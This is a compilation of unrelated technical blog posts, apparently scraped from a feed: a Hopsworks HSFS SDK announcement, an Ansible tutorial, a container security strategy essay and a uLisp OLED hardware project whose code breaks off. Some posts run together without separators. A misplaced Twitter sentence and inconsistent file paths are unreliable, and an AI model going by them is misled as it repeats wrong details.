<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><p>TLDR; <a href="http://www.hopsworks.ai/" target="_blank">Hopsworks Feature Store</a> interacts with the new Python and Scala/Java Software Development Kit (SDK) available in Hopsworks 2.0. The new SDK builds on our extensive experience working with Enterprise customers and users with Enterprise requirements. With this new release, we consolidate multiple libraries with a single one. We named it `HSFS` (HopsworkS Feature Store) and in this blog post we will be looking at some of the improvements and key features that the new SDK brings.</p><p>Today, we’re introducing the new Hopsworks Feature Store API. Rebuilt from the ground up, today’s release includes the first set of new endpoints and features we’re launching so developers can help the world connect to the public conversation happening on Twitter.&nbsp;</p><p>If you can’t wait to check it out, <a href="https://www.hopsworks.ai/" target="_blank">visit Hopsworks.ai</a> to get started. If you can, then read on for more about what we’re building, what’s new about the Feature Store API v2.<br></p><h2>Rethinking the Hopsworks Feature Store API</h2><p>The Hopsworks Feature Store was <a href="https://www.logicalclocks.com/blog/feature-store-the-missing-data-layer-in-ml-pipelines" target="_blank">first released at the end of 2018</a>, and it included a new type of Feature Store API based on the FeatureGroup (DataFrame). When designing the Hopsworks Feature Store, we looked at existing feature stores (<a href="https://eng.uber.com/michelangelo-machine-learning-platform/" target="_blank">Michelangelo</a> by Uber and <a href="https://databricks.com/session/zipline-airbnbs-machine-learning-data-management-platform" target="_blank">Zipline</a> by AirBnb) that provided Domain Specific Language (DSL) APIs to their Feature Stores - you declaratively define features, and the DSL is then executed to ingest feature data into the Feature Store. However, we were building a general-purpose Feature Store and we knew that history has not been kind to DSLs - they have their day in the sun, but general purpose frameworks and languages win out in the long-run. So, we went with the FeatureGroup (DataFrames in Spark or Pandas) as the way to ingest and export features to/from the Hopsworks Feature Store. Since then, other Feature Stores have followed our approach, such as Feast that introduced <a href="https://github.com/feast-dev/feast/releases/tag/v0.3.0" target="_blank">FeatureSets in 0.3</a> almost 1 year later and <a href="https://github.com/feast-dev/feast/releases/tag/v0.8.0" target="_blank">Spark support</a> almost 2 years later).&nbsp;</p><p>However, our API still encouraged developers to think of features as existing in a flat namespace. With great customers, such as <a href="https://www.paddypower.com/bet" target="_blank">PaddyPower</a>, we rethought and redesigned our Feature Store API to consider other practical problems we encountered, such as making breaking changes to FeatureGroup schemas without breaking existing feature pipelines, handling feature naming conflicts, and redesigning a minimal single client library (from 2 libraries previously) that can run in either a (Py)Spark or Python environment. That library is now released as our new Feature Store API and is called <a href="https://github.com/logicalclocks/feature-store-api" target="_blank">HSFS</a>.<br></p><h2>Feature Reuse with Pandas-like Joins</h2><p>HSFS provides a DataFrame API to ingest data into the Hopsworks Feature Store. You can also retrieve feature data in a DataFrame, that can either be used directly to train models or materialized to file(s) for later use to train models</p><p>The idea of the Feature Store is to have pre-computed features available for both training and serving models. The key functionality required to generate training datasets from reusable features are: feature selection, joins, filters and point in time queries. To enable this functionality, we are introducing a new expressive Query abstraction with HSFS that provides these operations and guarantees reproducible creation of training datasets from features in the Feature Store.&nbsp;</p><p>The new joining functionality is heavily inspired by the APIs used by Pandas to merge DataFrames. The APIs allow you to specify which features to select from which feature group, how to join them and which features to use in join conditions.</p><p>If a data scientist wants to modify a new feature that is not available in the Feature Store, she can write code to compute the new feature (using existing features or external data) and ingest the new feature values into the Feature Store. If the new feature is based solely on existing feature values in the Feature Store, we call it a <em>derived feature</em>. The same HSFS APIs can be used to compute derived features as well as features using external data sources.</p><div><p># create a query<br>feature_join = rain_fg.select_all()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.join(temperature_fg.select_all(), on=["date", "location_id"])<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.join(location_fg.select_all())</p><p>td = fs.create_training_dataset("rain_dataset",<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;version=1,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;label=”weekly_rain”, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data_format=”tfrecords”)</p><p># materialize query in the specified file format<br>td.save(feature_join)</p><p># use materialized training dataset for training, possibly in a different environment<br>td = fs.get_training_dataset(“rain_dataset”, version=1)</p><p># get TFRecordDataset to use in a TensorFlow model<br>dataset = td.tf_data().tf_record_dataset(batch_size=32, num_epochs=100)</p><p># reproduce query for online feature store and drop label for inference<br>jdbc_querystring = td.get_query(online=True, with_label=False)</p></div><p>When using HSFS to create a training dataset, the features, their order and how the feature groups are joined is also saved as metadata. This metadata is then used at serving time to build a JDBC query that is executed by a client (along with the feature group primary key values) to request a feature vector from the online Feature Store for a specific model.<br></p><h2>Features belong in a hierarchical namespace</h2><p>When we started building the Hopsworks Feature Store we wanted to create a flat namespace for features to make it easier for data scientists to pick the features they wanted. But as soon as our customers started having tens of thousands of features in the feature store, feature naming conflicts became commonplace.&nbsp;</p><p>Features like <em>created_on, customer_id, account_id, </em>are often used in many different unrelated Feature Groups. The same user might, for example, have a different account_id for each service the company provides.Imagine an e-commerce use case - most likely you will have multiple `created_on` or `revenue`-named features.</p><p>In HSFS we solved this challenge by requiring users to work with the feature group abstraction - users have to specify which features they need from which feature group. The feature groups abstraction also allows the query planner to intelligently&nbsp; identify which feature to use when joining features from different feature groups.<br></p><h2>Time travel as first class citizen</h2><p>Hopsworks has offered support for <a href="https://hudi.apache.org/" target="_blank">Apache Hudi</a> for over one year. Apache Hudi is the key component to make time travel, upserts, and ACID updates possible on feature data. Time travel enables data engineers and data scientists to retrieve a previous snapshot of the feature data for debugging and auditing purposes.&nbsp;</p><p>In HSFS, we added support for complex time travel queries, allowing users to create training datasets by retrieving different feature groups at different points in time. The different times are stored as metadata alongside the training datasets. This enables users to easily reproduce the creation of training datasets with historical feature values.</p><p>The new SDK improves support for Apache Hudi by integrating directly with the feature groups and joining APIs. Apache Hudi is also now available for the Python APIs. The APIs hide the complexity of dealing with Apache Hudi options. At the same time the high level APIs will allow us to implement support for additional formats such as <a href="https://delta.io/" target="_blank">Delta Lake</a>.<br></p><h2>Provenance and custom metadata</h2><p>Provenance for feature data is a key new functionality available as part of HSFS. Hopsworks Feature Store implicity tracks dependencies between feature groups, training datasets and models. Provenance allows users to know, at any given moment, what features are the most widely used and also what features are not used anymore and could potentially be removed from the feature store. Provenance also enables users to traverse from a model to the application used to train it, the input training dataset used, and the features and feature group snapshots used to create the training dataset.</p><p>In this new release we also allow users to create and attach user-defined labels to feature groups and training datasets. Labels and tags enable users to build a custom metadata catalog for their Feature Store, that (using <a href="https://opendistro.github.io/for-elasticsearch/" target="_blank">Elasticsearch</a>) supports low-latency free-text search over potentially thousands of features, descriptions, labels and tags.<br></p><h2>ML Framework APIs to Training Datasets</h2><p>While the Hopsworks feature store plays a key role in defining governance around feature data, improving execution speed when it comes to experimenting, building and deploying models, the ultimate customers of the feature stores are the data scientists and machine learning engineers.</p><p>To make their interaction with the feature store as smooth as possible, we added support retrieving training dataset as a TensorFlow Dataset format using tf.Data. This allows data scientists to efficiently read training datasets in their TensorFlow code.<br></p><h2>Pure Python Feature Engineering</h2><p>Alongside existing support for (Py)Spark, this release also brings supports for feature engineering pipelines built using pure Python programs. With HSFS you are able to upload feature data to the feature store from your SageMaker notebook, KubeFlow, Jupyter notebook, or even your local machine.</p><p>This is in addition to the existing capabilities of exploratory data analysis with the feature store from your notebook, and the creation and reading of training datasets.<br></p><h2>Get started</h2><p>You can get started immediately by creating a new cluster on <a href="https://hopsworks.ai/" target="_blank">https://hopsworks.ai</a>, the library is already pre-installed in your environment so you can get started straight away.</p><p>The <a href="https://docs.hopsworks.ai/" target="_blank">documentation</a> is available and you can walk through one of the many example <a href="https://github.com/logicalclocks/hops-examples/tree/master/notebooks/featurestore/hsfs" target="_blank">notebooks</a> that are available here.</p></div></div></div></div></div></div>]]>

November 17, 2020 | https://steampunk.si/blog/getting-started-with-ansible/ | <a href="https://web.archive.org/web/*/https://steampunk.si/blog/getting-started-with-ansible/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>In our <a href="https://steampunk.si/blog/introduction-to-configuration-management-tools/" title="Introduction to tonfiguration management tools post">previous blog post</a>, we looked at what configuration management
tools bring to the table. And in this post, we will take a closer look at
Ansible, our configuration management tool of choice. So if you want to learn
what Ansible is, what it does, and how it works, this is the post for you.</p>
<p>We will start by introducing <a href="https://www.ansible.com/" title="Ansible's home page">Ansible</a> and some of the benefits we gain when
using it. Next, we will describe the differences between three different
Ansible packages and give some advice on picking the right one for our use
case. We will continue with the installation instructions and finally wrap up
with an interactive walkthrough of Ansible’s basic functionality like running
Ansible playbooks and installing extra Ansible content.</p>
<h2 id="what-is-ansible">What is Ansible</h2>
<p>We all probably heard about automation systems that suffer from <em>managing the
management</em> and <em>automating your automation</em> issues. Ansible not only brings
order to our infrastructure, but it also does it sustainably.</p>
<p>Because Ansible is <strong>agentless</strong>, dealing with daemons being down,
upgrading agents, and patching agent security vulnerabilities are a thing of
the past.  All we need to do is keep our control node (the computer where the
Ansible runs) updated, and we should be safe.</p>
<p>But what does Ansible do exactly? <strong>Ansible’s primary responsibility is to
reliably enforce the desired state on a set of targets.</strong></p>
<p>We usually keep the state description in a relatively human-friendly and
machine-executable file called an Ansible playbook. We have a bit more
flexibility when it comes to storing information about targets. We can use:</p>
<ol>
<li><strong>Static inventory files</strong> that contain login information for our targets.</li>
<li><strong>Inventory plugins</strong> that fetch connection information from some
canonical sources like IaaS API.</li>
</ol>
<p><strong>Enforcing the desired state</strong> in the Ansible world can mean almost anything:
writing a configuration file, creating a virtual machine in the cloud, adding
a VLAN to a network switch, etc. All we need is an Ansible module for
performing the task at hand. And there are a lot of them available out there.
We will talk more about how to obtain them in the last part of this post.</p>
<p><strong>Target</strong> (or <strong>host</strong>) is also quite a broad term in the Ansible world.
Historically, the primary target type was a virtual machine that Ansible
managed via the Secure Shell (SSH) protocol. But today, Ansible can control
many other things like containers, networking equipment, and various
Infrastructure as a Service (IaaS) platforms. And because Ansible is
agentless, getting it to work with a specific piece of software or hardware is
usually much easier compared to other configuration management tools.</p>
<p>Now we are ready to start talking about Ansible versions.</p>
<h2 id="what-ansible-package-to-use">What Ansible package to use</h2>
<p>Today, there are three Ansible packages that we can use for our day-to-day
automatization tasks: <code>ansible-2.9</code>, <code>ansible-2.10</code>, and <code>ansible-base-2.10</code>.
Why? Because the monolithic Ansible package was split into a core engine and a
few bundles of Ansible content called Ansible Collections for the 2.10
release.</p>
<p>But fortunately for us, selecting the correct package is relatively simple.
Just answer the following questions in order and stop when you answer “yes”
for the first time:</p>
<ol>
<li>Are you a Red Hat subscriber or want to purchase support? Use
<strong>ansible-2.9</strong>.</li>
<li>Do you have existing playbooks and no time to learn about Ansible
Collections? Use <strong>ansible-2.10</strong>.</li>
<li>Use <strong>ansible-base-2.10</strong>.</li>
</ol>
<p>We made sure examples from this blog post work with all of the versions
mentioned above, so you should have no trouble following along.</p>
<h2 id="how-to-install-ansible">How to install Ansible</h2>
<p>We only need to install Ansible onto the control node (the computer or virtual
machine you will run Ansible commands on). The most flexible way of installing
Ansible is using <code>pip</code>:</p>
<pre><code>$ pip install --user "ansible==2.9.*"  # For ansible 2.9
$ pip install --user ansible           # For ansible 2.10 and newer
$ pip install --user ansible-base      # For ansible-base
</code></pre>
<p>This will install Ansible only for our user account and not mess up the system
if anything goes wrong.</p>
<p>We can also install Ansible using our distribution’s package manager (for
example, <code>dnf</code> on RHEL 8 or <code>apt</code> on Debian-derived distributions).</p>
<pre><code>$ yum install ansible  # RHEL and CentOS 7
$ dnf install ansible  # RHEL and CentOS 8
$ apt install ansible  # Debian and Ubuntu
</code></pre>
<p>But bear in mind that most distributions do not package <code>ansible-base</code> and
<code>ansible</code> 2.10 yet, so you might need to resort to the <code>pip</code> method for the
time being. Official <a href="https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html" title="Official installation instructions">installation instructions</a> contain even more
installation-related details.</p>
<p>Unfortunately, we cannot use a Windows machine as an Ansible control node.
Matt Davis, one of the core Ansible developers, wrote a
<a href="http://blog.rolpdog.com/2020/03/why-no-ansible-controller-for-windows.html" title="Why no Ansible controller for Windows?">blog post</a> about the reasons. Matt also gives some hints about
what Windows users can do to remedy the situation, so make sure you check his
post out.</p>
<p>Once the installation is behind us, we should be able to run the following
command without errors:</p>
<pre><code>$ ansible --version
ansible 2.9.14
  config file = /etc/ansible/ansible.cfg
  configured module search path = ['/usr/share/ansible/plugins/modules']
  ansible python module location = /usr/lib/python3.8/site-packages/ansible
  executable location = /usr/bin/ansible
  python version = 3.8.6 (default, Sep 25 2020, 00:00:00) [GCC 10.2.1 20200723]
</code></pre>
<p>If nothing went awry, we are ready to start playing with Ansible.</p>
<h2 id="taking-ansible-for-a-spin">Taking Ansible for a spin</h2>
<p>In this last section, we will play around a bit with Ansible. We will start by
analyzing a small Ansible playbook and explaining the purpose of its
components, continue with discussing the Ansible inventory, and conclude
our escapade with some custom Ansible content installation.</p>
<p>If you would like to follow along with us, you will need a Linux computer with
Ansible and Docker installed.</p>
<h3 id="ansible-playbook">Ansible playbook</h3>
<p>Let us start with something relatively simple:</p>
<pre><code>---
- name: Configure local computer
  hosts: localhost

  tasks:
    - name: Create config file
      ansible.builtin.copy:
        dest: /tmp/my.cfg
        content: Hello, World!
</code></pre>
<p>Even if you never heard about Ansible playbook or YAML before, you probably
guessed that we want to create the <code>/tmp/my.cfg</code> file with the <code>Hello, World!</code>
inside it on our local computer. Let us test this. When we run the
<code>ansible-playbook</code> command (we assumed that the playbook is stored in the
<code>play.yaml</code> file), we will see something like this:</p>
<pre><code>$ ansible-playbook play.yaml
[WARNING]: provided hosts list is empty, only localhost is available. Note
  that the implicit localhost does not match 'all'

PLAY [Configure local computer] ******************************************

TASK [Gathering Facts] ***************************************************
ok: [localhost]

TASK [Create config file] ************************************************
changed: [localhost]

PLAY RECAP ***************************************************************
localhost              : ok=2    changed=1    unreachable=0    failed=0
                         skipped=0    rescued=0    ignored=0
</code></pre>
<p>And sure enough, if we open the <code>/tmp/my-cfg.txt</code> file, the hello is there ;)
But how did Ansible know what to do? Explanation time ;)</p>
<p>Ansible playbook is nothing more than a list of plays that Ansible executes
one after another. For the sake of simplicity, our example contains a single
Configure local computer play. The <code>hosts: localhost</code> line informed Ansible
that we will be messing with our local computer. This is the target that we
talked about previously.</p>
<p>All real action happened in the <code>tasks</code> section of the play. The
<code>ansible.builtin.copy:</code> line told Ansible that we want to use the built-in
copy module to create a file. And the <code>dest: /tmp/my-cfg.txt</code> and <code>content: Hello</code> parameter lines provided information to the copy module about our
file’s location and what to place inside it, respectively. The line that
starts with <code>- name</code> serves as documentation for us and is printed to the
output when Ansible starts executing the task at hand.</p>
<p>Technically speaking, Ansible did not create a file. It would be more accurate
to say that Ansible made sure our text file exists and has the correct
content. We can see this technical nitpick in action if we run the same
<code>ansible-playbook</code> command again:</p>
<pre><code>$ ansible-playbook play.yaml
[WARNING]: provided hosts list is empty, only localhost is available. Note
  that the implicit localhost does not match 'all'

PLAY [Configure local computer] ******************************************

TASK [Gathering Facts] ***************************************************
ok: [localhost]

TASK [Create config file] ************************************************
ok: [localhost]

PLAY RECAP ***************************************************************
localhost              : ok=2    changed=0    unreachable=0    failed=0
                         skipped=0    rescued=0    ignored=0
</code></pre>
<p>Notice how in the previous run, Ansible reported our file creation task as
changed, and in this last run, the output changed to ok. This happened because
Ansible determined that the file’s current and desired state are precisely the
same, and there is nothing to do.</p>
<p>But our configuration files are rarely entirely static, meaning that we often
need to customize their content based on some external information. And this
is where variables and <code>ansible.builtin.template</code> module come into play - pun
intended ;).</p>
<p>Using variables in templates is reasonably straightforward: we just need to
place the variable name inside double curly braces, and the template module
will replace it with the variable’s value. For example, this is how our
parameterized configuration file could look:</p>
<pre><code>{{ greeting }} from {{ ansible_distribution }}, World!
</code></pre>
<p>But before we can use the variable, we need to define it somewhere. There are
<a href="https://docs.ansible.com/ansible/latest/user_guide/playbooks_variables.html" title="Official Ansible documentation in variables">many places</a> where Ansible will look for variable definitions, but we
will keep it simple and provide them as part of the playbook (the <code>vars</code>
section in the listing below).</p>
<pre><code>---
- name: Configure local computer
  hosts: localhost

  vars:
    greeting: Welcome

  tasks:
    - name: Create config file
      …</code></pre></div></div>

    <div>
        <div>
            <p>Securing containers is a complex task.  The problem space is broad, vendors are on fire, there are tons of checklists and best practices and it’s hard to prioritize solutions. So if you had to <strong>implement a container security strategy</strong> where would you start?</p>

<p>I suggest to start from the basics: understanding <strong>what container security is about</strong> and build a model to navigate risks.</p>

<h2 id="follow-the-devops-life-cycle">Follow the DevOps Life Cycle</h2>

<p>Every security initiative is eventually constrained by where security controls can be implemented, so I find practical to just follow the standard DevOps life cycle to <em>surface patterns™</em> and <em>unlock synergies™</em>.</p>

<p>The DevOps Lifecycle is an infinite iteration of:</p>

<ul>
<li>Plan</li>
<li>Code</li>
<li>Build</li>
<li>Test</li>
<li>Release</li>
<li>Deploy</li>
<li>Operate</li>
<li>Monitor</li>
</ul>

<p><img src="https://cloudberry.engineering/devops-lifecycle.jpg" alt="DevOps Lifecycle - source: ryadel.com"></p>

<p>Containers are included in the application in the form of a Dockerfiles but are not really part of it. As such they don’t interest the planning and coding phase.</p>

<p><em>(no, writing Dockerfiles is not coding.)</em></p>

<p>Every other step is in scope from a security point of view, and I would group them like this:</p>

<ul>
<li><strong>Build Time</strong>: build, test and release.</li>
<li><strong>Container Infrastructure</strong>: deploy and operate.</li>
<li><strong>Runtime</strong>: monitor.</li>
</ul>

<p>Why? Every security strategy is only effective if it can be implemented. And every step in each group share a common facility where security controls can be injected without adding much friction:</p>

<ul>
<li>Build Time: The CI/CD infrastructure, the container registry</li>
<li>Container Infrastructure: the container orchestrator</li>
<li>Runtime: the production environment</li>
</ul>

<p>Now we have three macro areas we can use as a starting point to do our risk assessments.</p>

<h2 id="security-at-build-time">Security at Build Time</h2>

<p>At build time we have in input a bunch of source files and a Dockerfile, and we get as output a Docker image.</p>

<p>This is where most vendors tend to cluster while trying to sell you the narrative of the importance of scanning container images and calling it a day.  Container security scanning is important, yes, but it’s not enough.</p>


<div>
<p><strong>This stage goal</strong>:</p>

<ul>
<li>minimize the risk of supply chain attacks.</li>
</ul>
</div>


<h3 id="container-images-hygiene">Container Images Hygiene</h3>

<p>First, decide how your images should look like, with a focus on how software dependencies are introduced:</p>

<ul>
<li>what base images are developers allowed to use?</li>
<li>are software dependencies pinned? From where are they pulled?</li>
<li>are there any labels that are needed to simplify governance and compliance?</li>
<li>lint the Dockerfile</li>
<li>follow <a href="https://cloudberry.engineering/article/dockerfile-security-best-practices/">Docker security best practices</a> when writing Dockerfiles</li>
</ul>

<p>All of these checks are static and can be implemented for cheap as a step in the build pipelines.</p>

<h3 id="container-images-scanning">Container Images Scanning</h3>

<p>Then we can move into scanning the container image.</p>

<p><strong>Do not scan the image as a step in the build pipeline</strong>, instead setup continuous scanning in the container registry.</p>

<p>Why? Vulnerabilities are continuously discovered while your services are not necessarily continuously built. Secondly, builds are additive: every build will generate a new image. So, assuming  your container orchestrator trust your registry, every tag you publish can always be deployed and need to be assessed.</p>

<p><em>(It’s also very slow to scan at build time)</em></p>

<p>This is where you start thinking about defining <strong>patch management</strong> and <strong>shelf life</strong> processes:</p>

<ul>
<li>patch management: results from the scanning will feed a patching process that will result in a new version of the image</li>
<li>shelf life: unpatched/old/unsafe images are deleted from the registry</li>
</ul>

<p><em>(next article will be about how to choose a container scanning solution, if you are facing the dilemma right now feel free to <a href="mailto:hello@clouberry.engineering">ping me</a>)</em></p>

<h2 id="container-infrastructure-security">Container Infrastructure Security</h2>

<p>The container infrastructure is comprised of all the moving parts that are in charge of pulling your images from the registry and run them as containers in production.</p>

<p>It’s mostly going to be the container orchestrator – <em>*cough* kubernetes *cough*</em>.</p>


<div>
<p><strong>This stage goals</strong>:</p>

<ul>
<li>Avoid platform misconfigurations with security implications</li>
<li>Minimize the <strong>breadth</strong> of an attack from a compromised container</li>
</ul>
</div>


<h3 id="security-of-the-infrastructure-misconfigurations">Security OF the Infrastructure: Misconfigurations</h3>

<p>Container orchestrators are complex, Kubernetes in particular. As of now they fail the promise of DevOps and I think we are still an abstraction layer (or two) away from being a mainstream solution without too much operational overhead.</p>

<p>Every complex platforms is prone to be misconfigured, and this is the part you want to focus on.</p>

<p>You have to threat model your infrastructure to <strong>ensure it can’t be abused</strong>.
This particular thread model should focus on every actor but a compromised container (we will cover that next).</p>

<p>I can’t go into details here, because it really depends on what you are running. For Kubernetes a good starting point for threat modelling is <a href="https://www.marcolancini.it/2020/blog-kubernetes-threat-modelling/">this</a>.</p>

<p>Additionally, if you are not doing it yet, this is also a <strong>good argument in favour of using a managed platform</strong>: the complexity is reduced if you can leverage a shared responsibility model with your (trusted) provider.</p>

<h3 id="security-in-the-infrastructure-lateral-movements">Security IN the infrastructure: Lateral Movements</h3>

<p>Next we can talk about what happens when a container is compromised.</p>

<p>You want to minimize the <a href="https://cloudberry.engineering/article/lateral-movement-cloud/">attacker’s ability to move laterally</a>, focusing on these two layers:</p>

<ul>
<li>The network layer</li>
<li>The Identity and Access management (IAM) layer</li>
</ul>

<p><strong>The network should not be flat</strong>. You can start by brutally segment everything into subnetworks and work your way up to a full fledge service meshes.</p>

<p>On the IAM layer work your way toward having a <strong>single identity for each container</strong> in order to fine tune the authorization grants. This is particularly important in multi tenant platforms: without granular identities it’s impossible to achieve least privilege.</p>

<p><em>(Google Kubernetes Engine (GKE) has a nifty feature for this called <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity">Workload Identity</a>)</em></p>

<p>Finally, since they are supposed to be immutable, a wonderful strategy would be to <strong>reduce the amount of time containers can run</strong>: the window of opportunity for attackers to move laterally and gain persistence is as long as the container running lifetime. Continously shut down and spin up your containers.</p>

<p>And this final consideration allow me to smoothly move into the next area.</p>

<h2 id="runtime-security">Runtime Security</h2>

<p>The last piece of the puzzle is the security of your running workloads.
At this point most of the hardening is done and here is when we move into the realm of reactive security controls, the grim land of <strong>post-fail</strong>.</p>


<div>
<p><strong>This stage goal</strong>:</p>

<ul>
<li>is to minimize the <strong>impact</strong> of an attack from a compromised container.</li>
</ul>
</div>


<h3 id="detection-and-incident-response">Detection and Incident Response</h3>

<p>The best way to control the impact of an attack is to minimize the time between the breach to when the security team is alerted.</p>

<p>Detecting an ongoing breach is another area where vendors are scrambling to find a silver bullet. There are many approaches, most of them will require side cars and/or daemon sets actively monitoring pod’s traffic and system calls.</p>

<p>Most solutions will provide some value but my advice is to start simple and iterate: use your existing SIEM, ingest your platform, application and audit logs.</p>

<p><strong>Incidents will happen</strong>, and it’s fine: have an incident response process.</p>

<p>The first bullet point of every post-mortem should be: <em>“how can we detect this quicker next time?”</em> answering will allow you to identify your blind spots, which you can then use to understand what signals you are missing and what makes sense to buy.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Container security is a broad problem and it is not just about scanning images.</p>

<p>This is the model I built and used to reason about container risks and solutions. It’s very high level and of course, as with every model, <strong>it’s not necessarily the right one</strong>.</p>

<p>We all know that in reality each infrastructure is a snowflake: so start with your own threat model and use this one <strong>as an inspiration</strong>.</p>

<p>The Visible Lisp Computer is a Lisp interpreter that displays the contents of the Lisp workspace on an OLED display, so you can see program execution and garbage collection in real time:</p>
<p><img src="http://www.technoblogy.com/pictures/kvm/visiblelispcomputer3.jpg" alt="VisibleLispComputer3.jpg" width="710" height="350">&nbsp;</p>
<p><em>Visible Lisp Computer displays the contents of the Lisp workspace on an OLED display as it runs.</em></p>
<p>It's a special version of my uLisp interpreter for ARM boards <sup id="cite_ref1"><a href="#cite_note1">[1]</a></sup>, designed to run on an Adafruit ItsyBitsy M0, or an ATSAMD21E on a prototyping board, interfaced to an I2C OLED display.</p>
<p>For example, when you evaluate a recursive function, such as the Fibonacci function, you can see the memory being allocated to perform the calculation, and garbage collections clearing unused memory. Apart from being fun, it's educational, giving an insight into how a language with garbage collection works.</p>
<h3>Introduction</h3>
<p>The Visible Lisp Computer runs on an Adafruit ItsyBitsy M0, which is an ideal ATSAMD21 board for running uLisp. It's available from Adafruit&nbsp;<sup id="cite_ref2"><a href="#cite_note2">[2]</a></sup>, or Pimoroni in the UK&nbsp;<sup id="cite_ref3"><a href="#cite_note3">[3]</a></sup>.</p>
<p>The Lisp workspace is displayed on a 64x48 OLED display. This is an ideal fit, as uLisp running on an ATSAMD21 gives you a workspace of 3072 free Lisp objects (each of 8 bytes), and the 64x48 display provides 3072 pixels. I chose a low-cost monochrome I2C display, available from AliExpress&nbsp;<sup id="cite_ref4"><a href="#cite_note4">[4]</a></sup>. The program would also work on larger SSD1306-based OLED displays, such as the widely available 128x64 ones.</p>
<p>Free Lisp objects are displayed in black, and when an object is in use it is displayed in white. Periodically you see the garbage collection reclaiming used objects that can no longer be accessed.</p>
<h3>The circuit</h3>
<p>Here's how to connect up the display to the Adafruit ItsyBitsy M0:</p>

<p><em>Circuit of the Visible Lisp Computer based on an Adafruit ItsyBitsy M0.</em></p>
<p>You need pullup resistors of about 4.7kΩ from SDA and SCL to VCC.</p>
<p>Instead of using an Adafruit ItsyBitsy M0 you can build an equivalent Visible Lisp Computer using an ATSAMD21E on a prototyping board by following my earlier project&nbsp;<a href="http://www.technoblogy.com/show?2833">Minimal ATSAMD21 Computer</a>:</p>
<p><img src="http://www.technoblogy.com/pictures/kvm/visiblelispcomputerproto.jpg" alt="VisibleLispComputerProto.jpg" width="710" height="375"></p>
<p><em>Version of the Visible Lisp Computer built on a prototyping board.</em></p>
<p>The I2C OLED display connects to GND, VCC, SDA (pin 21), and SCL (pin 22). Again, you need 4.7kΩ pullup resistors from SDA and SCL to VCC.</p>
<h3>Example</h3>
<p>Here's an example of the Visible Lisp Computer in action.</p>
<p>First we enter a sample Lisp function to evaluate; I'll use the Fibonacci function, as it should be familiar to most programmers:</p>
<pre>(defun fib (n)
  (if (&lt; n 3) 1
    (+ (fib (- n 1)) (fib (- n 2)))))</pre>
<p>Initially the display is black. After entering this in the Serial Monitor the display shows:</p>
<p><img src="http://www.technoblogy.com/pictures/kvm/visiblelispcomputer1.jpg" alt="VisibleLispComputer1.jpg" width="710" height="350"></p>
<p>The function is stored in the Lisp workspace as a series of Lisp objects, indicated by the row of white pixels starting in the top left corner.</p>
<p>Evaluating the function by entering, for example:</p>
<pre>(fib 10)</pre>
<p>allocates Lisp objects as the function is executed, indicated by a white block extending down from the top of the display:</p>
<p>&nbsp;<img src="http://www.technoblogy.com/pictures/kvm/visiblelispcomputer2.jpg" alt="VisibleLispComputer2.jpg" width="710" height="350"></p>
<p>This call to the Fibonacci function executed within the workspace available, without triggering a garbage collection.</p>
<p>If we now evaluate:</p>
<pre>(fib 16)</pre>
<p>the function triggers several garbage collections as it executes to reclaim unused objects, while leaving the intermediate values, which are still in use, visible on the display:</p>
<p>&nbsp;<img src="http://www.technoblogy.com/pictures/kvm/visiblelispcomputer3.jpg" alt="VisibleLispComputer3.jpg" width="710" height="350"></p>
<h3>Turning off the workspace display</h3>
<p>The workspace display is on by default. Because updating the display causes Lisp programs to run more slowly, I've added a Lisp command&nbsp;to turn the display off; give the command:</p>
<pre>(display nil)</pre>
<p>To turn it back on again give the command:</p>
<pre>(display t)</pre>
<p>The standard version of uLisp does a garbage collection after you input each command at the Serial Monitor or REPL. When running the workspace display this is disabled, to avoid the lag caused by the garbage collection after every line of input. If you want to tidy up the screen display before running a program you can do a manual garbage collection by giving the command:</p>
<pre>(gc)</pre>
<h3>The program</h3>
<p>The workspace display interfaces with uLisp in three places. In each case a flag, <strong>DISPLAYFLAG</strong>, determines whether the workspace display is active.</p>
<h4>Lisp objects</h4>
<p>All objects in ARM uLisp consist of two 4-byte cells, so every object occupies 8 bytes. There are several different types of object, such as symbol, number, or cons, identified by the constant in the left-hand cell:</p>
<p><img src="http://www.technoblogy.com/pictures/kvm/objects1.gif" alt="Objects1.gif" width="422" height="80"></p>
<ul>
<li>A symbol contains '2' in the left cell, and the name of the symbol packed in the right cell, or a pointer to the symbol in a symbol table.</li>
<li>A number contains '4' in the left cell, and the 32-bit signed integer value in the right cell.</li>
<li>Finally, a cons contains an address pointer in each cell pointing to other objects.</li>
</ul>
<p>Address pointers are always larger than the largest constant used to identify other types of object.</p>
<h4>Initialising the workspace</h4>
<p>When the workspace is first initialised, by calling <strong>initworkspace()</strong>, all the objects are added to a list of free objects:</p>
<p><img src="http://www.technoblogy.com/pictures/kvm/objects2.gif" alt="Objects2.gif" width="720" height="78"></p>
<p>The corresponding pixels on the workspace display are plotted in black with a call to <strong>PlotObject()</strong>:</p>
<pre>void initworkspace () {
  Freelist = NULL;
